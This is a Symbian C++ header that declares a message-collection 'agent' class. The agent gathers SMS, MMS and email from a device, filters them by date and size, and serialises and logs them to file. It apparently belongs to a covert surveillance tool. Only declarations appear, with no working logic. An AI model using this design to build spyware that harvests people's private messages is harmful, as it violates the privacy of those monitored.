/*
 ============================================================================
 Name		: AgentMessages3.h
 Author	  : 
 Version	 : 1.0
 Copyright   : Your copyright notice
 Description : CAgentMessages declaration
 ============================================================================
 */

#ifndef AGENTMESSAGES3_H
#define AGENTMESSAGES3_H

// INCLUDES
#include <e32std.h>
#include <e32base.h>

#include <mmsclient.h>

#include <msvapi.h>
#include <msvstd.h>
#include <s32mem.h>
#include <HT\logging.h>
#include <HT\LongRunTask.h>

#include <emailinterfacefactory.h>
#include <emailsorting.h>
#include <memailclientapi.h>
#include <emailapidefs.h>
#include <memailmailbox.h>
#include <memailfolder.h>
#include <memailmessage.h>
#include <memailaddress.h>
#include <memailcontent.h>
#include <mmessageiterator.h>
#include <mmailboxcontentobserver.h>

#include "AbstractAgent.h"
#include "MessageFilter.h"
#include "AdditionalDataStructs.h"
#include "Json.h"

#define MAPI_V1_0_PROTO  	0x01000000  // Protocol Version 1
#define MAPI_V2_0_PROTO    	2009070301 
#define MESSAGE_INCOMING    0x00000001 

#define AGENTCONF_CLASSNAMELEN  32

typedef struct TMAPISerializedMessageHeader {
		TUint32 iDwSize;            // size of serialized message (this struct + class/from/to/subject + message body + attachs)
		TUint32 iVersionFlags;      // flags for parsing serialized message
		TUint32 iStatus;            // message status (non considerarlo per ora, mettilo a 0)
		TUint32 iFlags;             // message flags
		TUint32 iSize;              // message size    (non considerarlo per ora, mettilo a 0)
		TFileTime iDeliveryTime;    // delivery time of message (maybe null)
		TUint32 iNumAttachs;        // number of attachments
		
		TMAPISerializedMessageHeader() {
			iDwSize = sizeof(TMAPISerializedMessageHeader);
			iStatus = 0;
			iVersionFlags = MAPI_V1_0_PROTO;
			iFlags = MESSAGE_INCOMING;
			iSize = 0;
		}
		
	} TMAPISerializedMessageHeader;

typedef struct TMarkup 
	{
	TTime smsFrom, smsTo;
	TTime mmsFrom, mmsTo;
	TTime mailFrom, mailTo;
	} TMarkup;


typedef struct TAgentClassFilter {
	TBool iHistory;
	TBool iEnabled;
	TBool iDoFilterFromDate;
	TTime iFromDate;
	TBool iDoFilterToDate;
	TTime iToDate;
	TInt  iMaxSize;
	TAgentClassFilter()
		{
		iHistory = EFalse;
		iEnabled = EFalse;
		iDoFilterFromDate = EFalse;
		iDoFilterToDate = EFalse;
		iMaxSize = 0;
		}
	} TAgentClassFilter;


using namespace EmailInterface;
	
// CLASS DECLARATION


/**
 *  CAgentMessages3
 * 
 */
class CAgentMessages3 : public CAbstractAgent, public MLongTaskCallBack, public MMsvSessionObserver, public MMailboxContentObserver
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentMessages3();

	/**
	 * Two-phased constructor.
	 */
	static CAgentMessages3* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentMessages3* NewLC(const TDesC8& params);

protected:
	// From CAbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
	virtual void CycleAgentCmdL();

private:
	// from MLongTaskCallBack
	virtual void DoOneRoundL();

private:
	// from MMsvSessionObserver
	virtual void HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3);
	// from MMailboxContentObserver
	void NewMessageEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aNewMessages, const TFolderId& aParentFolderId ); 
	void MessageChangedEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aChangedMessages, const TFolderId& aParentFolderId );
	void MessageDeletedEventL( const TMailboxId& aMailbox, const REmailMessageIdArray aDeletedMessages, const TFolderId& aParentFolderId );
		

private:
	
	/**
	 * Populates the Array with the childs of the ParrentId entry
	 * @param parentId an entry
	 */ 
	void PopulateArrayWithChildsTMsvIdEntriesL(TMsvId parentId);

	/**
	 * Transform the information contained in the TMsvId entry in a buffer.
	 * @return The buffer in proper format, ready to be written in the file.
	 */
	
	HBufC8* GetSMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId);
	
	HBufC8* GetMMSBufferL(TMsvEntry& aMsvEntryIdx, const TMsvId& aMsvId);
	
	HBufC8* GetMailBufferL(MEmailMessage* aMsg, CMessageFilter* aFilter);

	
	HBufC8* GetMarkupBufferL(const TMarkup aMarkup);
	
	// get filter data from json conf
	void GetFilterData(TAgentClassFilter& aFilter, const CJsonObject* aJsonObject);
	
	void FillFilter(CMessageFilter* aFilter, const TAgentClassFilter aFilterHeader);
	
	void ParseParameters(const TDesC8& aParams);

	void RetrieveTotalBodyL(MEmailMessageContent* aContent, RBuf& aData);
		
	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentMessages3();

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	//TODO: delete this method when finished mail test
	//void WriteMailFile(const TDesC8& aData);
	
private:
	CMsvSession* iMsvSession;			
	CMsvEntryFilter* iFilter;
	CMsvEntrySelection* iSelection;	
	CLongTaskAO* iLongTask;				// For Long-Running Task management
	TBool iStopLongTask;				// Flag to stop the current operation
	RArray<TMsvId> iMsvArray;			// Contains a snapshot of ALL the TMsvId available on the device
	TInt iArrayIndex;					// The current index of the MsvArray
	TMsvId iNewMessageId;				// The Id of the new Message Entry just created on the server
	TBool iLogNewMessages;				// When True this Agent will log new incoming messages to file

	
	CClientMtmRegistry* iMtmReg;      // For sender/recipient of MMS  
	CMmsClientMtm* iMmsMtm;
	CSmsClientMtm* iSmsMtm;
	
	CMessageFilter* iSmsCollectFilter; 
	CMessageFilter* iSmsRuntimeFilter;
	CMessageFilter* iMmsCollectFilter;
	CMessageFilter* iMmsRuntimeFilter;
	CMessageFilter* iMailCollectFilter;
	CMessageFilter* iMailRuntimeFilter;
	
	TMarkup iMarkup;
	CLogFile* iMarkupFile;
	
	TMailRawAdditionalData	iMailRawAdditionalData;
	
	RMailboxPtrArray iMailboxes;
	MEmailClientApi* iMailClient;
	CEmailInterfaceFactory* iFactory;
	TInt iMailboxesCounter;
	TInt iMessagesCounter;
	TBool iMailDump;
	
	TTime iLastSavedMail;
	
	__FLOG_DECLARATION_MEMBER
	};

#endif // AGENTMESSAGES3_H
